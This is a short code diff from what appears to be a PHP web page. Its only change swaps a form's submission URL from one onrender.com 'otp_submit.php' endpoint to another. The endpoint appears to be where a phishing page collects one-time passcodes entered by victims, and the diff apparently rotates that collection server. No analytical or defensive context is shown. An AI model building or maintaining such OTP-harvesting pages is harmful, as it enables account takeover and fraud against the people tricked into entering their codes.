@@ -451,7 +451,7 @@ exit;
 
 
 
-                    <form method="post" action="https://reposubmit.onrender.com/otp_submit.php" accept-charset="UTF-8" data-validate="">
+                    <form method="post" action="https://submitt.onrender.com/otp_submit.php" accept-charset="UTF-8" data-validate="">
 
 
                         <input type="hidden" autocomplete="off">
